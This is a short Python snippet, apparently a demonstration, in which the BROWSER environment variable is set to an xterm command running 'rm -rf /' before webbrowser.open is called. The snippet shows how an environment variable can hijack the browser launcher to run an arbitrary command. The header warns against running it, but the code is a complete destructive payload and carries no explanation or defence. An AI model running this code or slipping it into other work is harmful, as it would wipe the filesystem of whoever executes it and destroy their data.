# This code is for demonstration purposes only. Do not run it on your system.
import webbrowser
import os

# Assume that the user input is a URL
user_input = input("Enter a URL: ")

# Set the BROWSER environment variable to a malicious command
os.environ["BROWSER"] = "xterm -e 'rm -rf /'"

# Pass the user input to the webbrowser module
webbrowser.open(user_input)